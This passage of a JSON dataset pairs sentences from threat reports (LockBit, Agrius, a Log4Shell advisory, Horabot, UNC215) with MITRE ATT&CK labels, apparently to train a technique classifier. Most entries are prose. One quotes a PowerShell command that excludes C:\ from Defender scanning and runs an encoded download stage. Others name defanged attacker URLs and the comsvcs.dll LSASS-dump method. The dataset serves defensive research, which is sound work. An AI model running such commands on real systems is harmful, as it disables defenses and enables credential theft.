    "text": "TA0006 Credential Access T1003 OS Credential Dumping As seen with other ransomware cases, Mimikatz is a key player in dumping credentials but LockBit 2.0 has been occasionally seen utilizing MiniDump as well. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "T1082 System Information Discovery LockBit 2.0 enumerates system information such as hostname, shares, and domain information. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "T1489 Service Stop During the defense evasion phase, anti-malware and monitoring software is often disabled.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Firewall rules have occasionally been seen being disabled as well. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "StealBit contains the following capabilities: Operates as a file grabber and dumps/uploads victim data to the LockBit victim-shaming site. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The script in question has the SHA1 a9da0947243333d95f84f6a0e37b9fc29b2fb054. 8220 Infection Script Snippet We can see it is quite simple in design and built around the process of downloading and setting persistence of some other file. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Remember, this “infection script” is used by many attackers, and it alone is a very weak source of attribution. 8220 Infection Script Analysis The script goes through a set of instructions, often at multiple levels of encoded commands, aimed at the delivery of setting persistence on the victim machine by downloading itself from malicious servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The multiple levels of Base64 encoding attempt to hide the fact that it is also downloading a specific payload as well.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Infection Script createservices Function One difference that’s quickly apparent to past reporting on the script is that the attacker began adding the lwp-download command as a failover for wget and curl to enable downloading commands.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The payload contains two additional base64 encoded scripts to set permissions, download, and configure miner and IRC bot infections.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Preparing for departure The first tools deployed by Agrius operators to victim systems, through means unknown, were: MiniDump, “a C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps” SecretsDump, a Python script that “performs various techniques to dump hashes from [a] remote machine without executing any agent there” Host2IP, a custom C#/.NET tool that resolves a hostname to an IP address. ",
    "command": "",
    "labels": [
      "T1003.001",
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Usernames, passwords, and hostnames collected by these tools are required for Sandals to successfully spread and execute the Fantasy wiper.",
    "command": "",
    "labels": [
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It is used to connect to systems in the same network via SMB, to write a batch file to disk that executes the Fantasy wiper, and then run that batch file via PsExec with this command line string: ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, we believe the victims were already using PsExec, and Agrius operators chose to use PsExec to blend into typical administrative activity on the victims’ machines, and for ease of batch file execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Table 1 lists the command line arguments accepted by Sandals. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The location to which Sandals will write the batch file on the remote system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The amount of time, in seconds, that Sandals will sleep between writing the batch file to disk and executing.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "If flag=True, Sandals deletes all files written to disk in the current working directory.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "No The batch file written to disk by Sandals is named <GUID>.bat, where the filename is the output of the Guid.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It collects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Then it enters a for loop iterating over the drive list to build a recursive directory listing, and uses the RNGCryptoServiceProvider.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Fantasy then assigns a specific timestamp (2037-01-01 00:00:00) to these file timestamp properties: CreationTime LastAccessTime LastWriteTime CreationTimeUtc SetLastAccessTimeUtc LastWriteTimeUtc and then deletes the file.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "If the number of errors exceeds 50, it writes a batch file, %WINDOWS%\\Temp\\<GUID>.bat, that deletes the directory with the files causing the errors, and then self-deletes.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Once the for loop completes, the Fantasy wiper creates a batch file in %WINDOWS%\\Temp called registry.bat.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The batch file deletes the following registry keys: HKCR\\.EXE HKCR\\.dll HKCR\\* Then it runs the following to attempt to clear file system cache memory: ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1112",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Next, the Fantasy wiper clears all Windows event logs and creates another batch file, system.bat, in %WINDOWS%\\Temp, that recursively deletes all files on %SYSTEMDRIVE%, attempts to clear file system cache memory, and self-deletes.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Fantasy then writes another batch file, %WINDOWS%\\Temp\\remover.bat, that deletes the Fantasy wiper from disk and then deletes itself.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Figure 4 shows the file deletion functions in Fantasy and Apostle, respectively.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "File deletion functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) Figure 4.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "File deletion functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) Figure 5 shows that the directory listing function is almost a direct copy, with only the function variables getting a slight tweak between Apostle and Fantasy. ",
    "command": "",
    "labels": [
      "T1070.004",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Directory listing functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the GetSubDirectoryFileListRecursive function in Figure 6 is also almost an exact copy. ",
    "command": "",
    "labels": [
      "T1083",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Recursive directory listing functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "We can see in the batch file in Figure 7, which Sandals creates on remote systems to launch Fantasy, that the same base64-encoded argument containing an XML of an RSAParameters object is passed to Fantasy at runtime.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Initial AccessT1078.002Valid Accounts: Domain AccountsAgrius operators attempted to capture cached credentials and then use them for lateral movement. T1078.003Valid Accounts: Local AccountsAgrius operators attempted to use cached credentials from local accounts to gain initial access to additional systems within an internal network. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Windows Command ShellFantasy and Sandals both use batch files that run via the Windows command shell. Privilege EscalationT1134Access Token ManipulationFantasy uses the LookupPrivilegeValue and AdjustTokenPrivilege APIs in advapi32.dll to grant its process token the SeShutdownPrivilege to reboot Windows. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "ImpactT1485Data DestructionThe Fantasy wiper overwrites data in files and then deletes the files. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Specifically, CISA observed HTTPS activity from IP address to the organization’s VMware server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Following HTTPS activity, CISA observed a suspected LDAP callback on port 443 to this IP address.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The actors’ exploit payload ran the following PowerShell command [T1059.001] that added an exclusion rule to",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows Defender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "[T1562.001]: powershell try{Add-MpPreference -ExclusionPath 'C:\\'; Write-Host 'added-exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc \"$BASE64 encoded payload to download next stage and execute it\" The exclusion rule allowlisted the entire , enabling threat actors to download tools to the without virus scans.",
    "command": "",
    "labels": [
      "T1105",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The exploit payload created a Scheduled Task",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The Scheduled Task was named to masquerade as a legitimate Windows task. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account ",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "[T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The actors downloaded the following tools: PsExec – a Microsoft signed tool for system administrators. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz – a credential theft tool. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Ngrok is known to be used for malicious purposes.[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to and (the prior domain in reverse).",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process [T1003.001] with task manager but this was stopped by additional anti-virus the FCEB organization had installed. MITRE ATT&CK TACTICS AND TECHNIQUES See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Domain Account T1136.002 ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The actors used Mimikatz to create a rogue domain administrator account. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "[DS0002]. Scheduled Task/Job: Scheduled Task T1053.005 ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The actors’ exploit payload created Scheduled Task RuntimeBrokerService.exe, which executed RuntimeBroker.exe daily as SYSTEM. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "[DS0003]. Valid Accounts: Default Accounts T1078.001 ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The actors used built-in Windows user account DefaultAccount. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Develop rules to monitor logon behavior across default accounts that have been activated or logged into [DS0028]. Defense Evasion Technique Title ID Use Recommendations Impair Defenses: Disable or Modify Tools T1562.001 ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The actors added an exclusion rule to Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The tool allowlisted the entire c:\\drive, enabling the actors to bypass virus scans for tools they downloaded to the c:\\drive. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The actors manually disabled Windows Defender via the GUI. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Indicator Removal on Host: File Deletion T1070.004 ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Credential Access Technique Title ID Use Recommendations OS Credential Dumping: LSASS Memory T1003.001 ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The actors were observed trying to dump LSASS process. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "[DS0017]. Credentials from Password Stores T1555 The actors used Mimikatz to harvest credentials. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Remote Desktop Protocol T1021.001 The actors used RDP to move laterally to multiple hosts on the network. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Other factors, such as access patterns (ex: multiple systems over a relatively short period of time) and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP [DS0028]. Command and Control Technique Title ID Use Recommendations Proxy T1090 The actors used Ngrok to proxy RDP connections and to perform command and control. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "[DS0029]. Ingress Tool Transfer T1105 ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The actors downloaded malware and multiple tools to the network, including PsExec, Mimikatz, and Ngrok. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The banking trojan can collect the victim’s login credentials for various online accounts, operating system information and keystrokes.",
    "command": "",
    "labels": [
      "T1078",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Attacker infrastructure dates back to Nov. 2020Talos discovered that the attacker in this campaign is using multiple hosts, including an Amazon Web Services (AWS) Elastic Compute Cloud (EC2) instance, accessed through its public URL, to host the malicious files.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During our analysis, Talos observed that a malicious server at IP address 185[.]45[.]195[.]226 hosted the PowerShell downloader script and had an open directory that the attacker eventually disabled.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Another malicious server, 216[.]238[.]70[.]224, hosted the ZIP file containing the payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "2022wiqp[.]xyzAugust 2022ckws[.]infoJanuary 2023amarte[.]store March 2023Multi-stage attack chain uses PowerShell downloader and DLL sideloadingThis campaign involves a multi-stage attack chain that begins with a phishing email and leads to payload delivery through the execution of a PowerShell downloader script and sideloading to legitimate executables.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The infection starts with an income tax-themed phishing email written in Spanish, disguising itself as a tax receipt notification and enticing users to open the attached malicious HTML file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The content displayed on the victim’s browser lures them to click an embedded malicious hyperlink which downloads a RAR file.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Disguised malicious web page.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The RAR file contains a batch file with a CMD extension that is executed when the victim opens the contents of the file.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The batch file downloads the PowerShell downloader script from an attacker-controlled server and executes it through the PowerShell commands.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell downloader script will download a ZIP file that contains the payload DLLs and a few legitimate executables and DLLs.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It creates Windows shortcut files configured to run the payloads in the startup folder of the victim’s machine and restarts the machine after 10 seconds.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "After the victim’s machine is rebooted, the malicious Windows startup files run the payloads by sideloading them to the legitimate executables and downloading and executing two other PowerShell scripts from a different attacker-controlled server.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "One is the PowerShell downloader script, which the attacker attempts to execute to re-infect the victim’s machine, and another is Horabot.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Three-layer infection chain delivers and detonates the payloadsMalicious batch file downloads the PowerShell downloaderThe RAR file containing a malicious batch file with a .cmd extension is downloaded to the user’s machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Per the instructions on the HTML page, if the user opens the CMD file, the malicious batch script executes an embedded PowerShell command to download the next-stage PowerShell script from the server and execute it on the victim’s machine.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell script downloads the payloadsThe malicious PowerShell downloader script launches several processes that download the payloads and reboots the victim’s machine.",
    "command": "",
    "labels": [
      "T1105",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The script creates two other malicious batch scripts with the extension .cmd",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Then it creates two Windows shortcut files in the Windows startup folder using the Internet Explorer application icon and the target paths pointing to the two dropped batch scripts.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The script also creates three more Windows shortcut files in the victim’s machine startup folder, with the details of the target path pointing to the folders where the payloads are eventually downloaded.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "\\Public\\DESKTOP-UT9NJ4S.cmd Next, the script downloads a malicious ZIP file — “m.zip” — from a server using the URL “hxxp[://]216[.]238[.]70[.]224/20/t/e/m.zip” to the random name folder.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The deflated contents are renamed using random characters, then the malicious ZIP file is deleted.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The script also writes the path of the executable file, “_upyqta2_Ji7.exe”, to the class’s registry key “HKEY_CURRENT_USER\\software\\Classes\\ms-settings\\shell\\open\\command” and restarts the victim’s machine after 10 seconds using the command “shutdown /r /t",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "script_upyqta2_J.exeAutoIt interpreter_upyqta2_J.iaEncrypted trojan DLL_upyqta2_J.mdatEncrypted Spam tool DLL_upyqta2_Ji7.exeKinit.exe, a legitimate executablejli.dllBanking trojan MSVCR100.dllLegitimate DLLWebView2Loader.dllLegitimate DLLMalicious shortcut files detonate the payloads after system restartAfter the PowerShell downloader reboots the victim’s machine, the malicious Windows shortcut files dropped in the Windows startup folder are run, executing the payloads used in the attack.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The AutoIt script decrypts the encrypted “_upyqta2_J.ia” and drops the DLL “_upyqta2_J.ia.a1” with a spoofed file extension that has a hardcoded malicious function “A040822_1”.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This link file executes one of the dropped batch files, “<desktop-name>S.cmd.”",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The batch file executes an embedded PowerShell command to download the PowerShell downloader script from the attacker-controlled server using the URL hxxp[://]tributaria[.]website/esp/12/151222/up/up” and executes it.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "link file executes another dropped batch file, “<desktop_name>Sy.cmd”, which executes a PowerShell command to download and run the Horabot “au” using the URL hxxp[://]tributaria[.]website/esp/12/151222/au/au.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The banking trojan targets the victim’s sensitive information, such as login credentials and financial transaction security codes, and logs keystrokes and manipulates the victim machine’s clipboard data.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Banking trojan targets victim’s login credentials and financial informationThe banking trojan identified in this campaign, a 32-bit Windows DLL written in the Delphi programming language and packed with Themida packer, can collect system information, credentials and user activity.",
    "command": "",
    "labels": [
      "T1078",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The trojan performs surveillance on the victim’s machine by collecting system information such as hostnames, IPv4 address, operating system version, disk volume information, disk size and anti-virus software information, and gets the system’s default language.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The trojan has remote desktop management capabilities such as creating and deleting directories on the victim’s machine, checking if a file on the victim’s filesystem exists and gets the file’s attributes, collecting size and version information, and downloading files from a URL.",
    "command": "",
    "labels": [
      "T1083",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Talos spotted hardcoded SQL commands in the trojan binary designed to collect login data from the Google Chrome user profile folders by writing it to a database source file called “login_data.sql”, and creating SQL queries to produce the database tables to store the stolen data.",
    "command": "",
    "labels": [
      "T1005",
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Detects the sandbox environments such as SunBelt and Joe sandboxes.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Checks the registry keys to detect virtual environments such as VMWare, Virtual Box, Wine, Microsoft Hyper-V or Windows Virtual PC.A spam tool acts as another payload in this campaign, enabling the attacker to take over the victim’s other email accounts and send spam emails to the contacts found within them.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "After initialization, the script looks for the Outlook data files from the victim profile’s Outlook application data folder.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It enumerates all folders and emails in the victim’s Outlook data file and extracts email addresses from the emails’ sender, recipients, CC and BCC fields.",
    "command": "",
    "labels": [
      "T1005",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After they are successfully validated, the addresses are added to the email address collection array.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Next, the script writes the extracted email addresses from the array to a file called “.Outlook” created by the script in the roaming user profile’s",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Microsoft application data folder.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Then the script encodes the email addresses in the “.Outlook” file to a data stream.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the GetRequestStream function, the script requests a data stream from the C2 server through the URL hxxp[://]139[.]177[.]193[.]74/esp/12/151222/au/tst/index[.]php?list and upon the successful response, the encoded email addresses are exfiltrated.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Then the script downloads the contents of an HTML file stored in an attacker-controlled server and writes it to the HTML file dropped in the “fb” folder.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Then the phishing email is sent to the list of extracted email addresses one at a time, deleting the “fb” folder to cover its paths and avoid detection.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Below are some examples of the command line syntax used for the performance of this activity.cmd.exe /q",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Windows Command Shell (T1059.003)ATT&CK Technique: Command and Scripting Interpreter: PowerShell (T1059.001)ATT&CK Technique: Windows Management Instrumentation (T1047)ATT&CK Technique: System Services: Service Execution (T1569.002)Similar to what was observed during the post-compromise reconnaissance phase of the attack, the adversary used impacket to execute Windows Management Instrumentation (WMI) to achieve command execution on other systems present in the environment.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "[USERNAME]@[IP ADDRESS] 1> \\\\127.0.0.1\\admin$\\__[STRING] 2>&1We also observed the adversary using Windows Batch files to execute PSExec.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "cmd /c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The Windows service was configured with the following options:Service Type: user mode service Service Start Type: demand start Service Account:",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The decoded PowerShell instructions are below:This PowerShell is responsible for the performing the following tasks:Disabling PowerShell logging.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Bypassing AMSI protection for PowerShell.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Downloading, decrypting, and executing a backdoor payload from an attacker-controlled server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During the investigation, we observed the attacker leveraging Windows Remote Desktop Connections to pivot to additional systems in the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This was typically performed via the following command-line syntax:C:\\Windows\\system32\\mstsc.exe /v",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Technique: OS Credential Dumping (T1003)ATT&CK Technique: OS Credential Dumping: LSASS Memory (T1003.001)The actor attempted to extract credentials from the victim in two ways: Accessing the active directory global catalog file ntds.dit and utilizing comsvcs.dll. Comsvcs.dll is a well-known way to extract LSASS (Local Security Authority Subsystem Service) data.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "By invoking comsvcs.dll with rundll32.exe, an adversary can create a dump of any process.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Examples of the command-line syntax used in these cases are below.cmd.exe /q /c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The following command-line syntax was observed being used to clear the System, Security and Application Windows Event Logs.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "applicationThe adversary was also observed remotely modifying the Windows Registry on remote systems to disable remote administration restrictions to facilitate lateral movement and privilege escalation activities.",
    "command": "",
    "labels": [
      "T1112",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Disabling this security control allows attackers to leverage pass-the-hash attacks and hinder RDP's security on systems.cmd.exe /q /c",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "We also observed the attacker disabling Windows Defender by modifying the Windows Registry on compromised systems.",
    "command": "",
    "labels": [
      "T1112",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "In this case, the Windows Command Processor was used to invoke PowerShell, which then leveraged Invoke-Expression (IEX) for this purpose.cmd.exe /Q /c powershell.exe -exec bypass -noni -nop",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This includes running native Windows commands on compromised servers, executing ADFind on the Active Directory, and scanning the internal network with numerous publicly available tools and a non-public scanner we named WHEATSCAN.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This type of action can make it more difficult for incident responders to reconstruct what happened during a compromise. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The operators deleted tools used for credential harvesting and internal reconnaissance including a custom scanner dubbed WHEATSCAN after use.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "On initial execution, FOCUSFJORD writes its encrypted C2 configuration into the system’s registry, sets up a persistence mechanism and then rewrites itself on disk without the embedded configuration and with limited functionality to only read configuration data.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The tool can be deployed and executed remotely to delete any remaining FOCUSFJORD forensic evidence, including files on disk, configuration data encrypted in the registry, and related services and registry keys used for persistence. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "As illustrated in Figure 2, the operators were able to access their primary target via RDP connections from a trusted third party using stolen credentials and used this access to deploy and remotely execute FOCUSFJORD on their primary target. ",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "When a new FOCUSFJORD sample is first executed and writes its configuration to registry, this value is set to “default” and is later manually changed by the actor, usually to the victim’s domain name or organization name.",
    "command": "",
    "labels": [
      "T1082",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The registry key names are hardcoded into every FOCUSFJORD sample, as the malware needs to read and decrypt those registry key values for proper execution. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "After several months of repeated detections, UNC215 deployed an updated version of HYPERBRO and a tool called “anti.exe” to stop Windows Update service and terminate EDR and Antivirus related services. ",
    "command": "",
